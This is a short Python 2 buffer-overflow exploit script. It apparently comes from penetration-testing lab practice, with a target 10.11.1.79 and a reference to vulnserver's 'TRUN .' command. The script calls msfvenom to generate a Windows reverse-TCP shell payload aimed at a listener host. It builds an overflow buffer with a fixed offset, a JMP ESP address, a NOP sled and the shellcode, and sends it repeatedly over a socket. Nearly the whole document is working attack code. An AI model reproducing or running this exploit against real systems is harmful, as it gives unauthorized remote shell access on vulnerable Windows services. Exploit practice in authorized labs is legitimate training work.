#!/usr/bin/python
import sys, socket
import os
from time import sleep


timeout = 5
#Add vulnerable server's IP address and port to connect
addr = ('10.11.1.79',2233)
#Add command to send prepended to the buffer, eg. 'TRUN .' for vulnserver.exe
cmd = ""
#your listener IP to get reverse shell, Required for the 'shell' step
lhost = "192.168.119.155"
lport = "445"
#Add bad characters to the list as you find them
bad = "\x00\x51"
#Update JMP ESP address to the below before running 'shell'
esp = "\x0d\x11\x20\x11"
offset = 2306
buffer = "A" * offset




def shellcode(addr,cmd,lhost,lport,j,esp,timeout):
	nop = "\x90" * 16
	paygen = 'msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} EXITFUNC=thread -f python -a x86 -b \"{}\" > payload.py'.format(lhost,lport,j)
	print "Generating shellcode..."
	print(paygen)
	os.system(paygen)
	from payload import *
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.settimeout(timeout)
			s.connect(addr)
#			s.recv(1024)
			s.send(cmd + buffer + esp + nop + buf)
			print "Sending shellcode with NOPs"
			s.close()
			sleep(1)
		except:
			print "Check listener for shell "
			return






########################
#For dispalying badchars in print messages
if len(bad) > 0:
	j = ''
	i = [ord(c) for c in bad]
	for x in range(0, 256):
		if x in i:
			j = j + "\\x{:02x}".format(x)

#########################



if len(esp) > 0:
	shellcode(addr,cmd,lhost,lport,j,esp,timeout)
else:
	print "To find 'JMP ESP' instruction, Run -> !mona jmp -r esp -cpb \"%s\" " % j
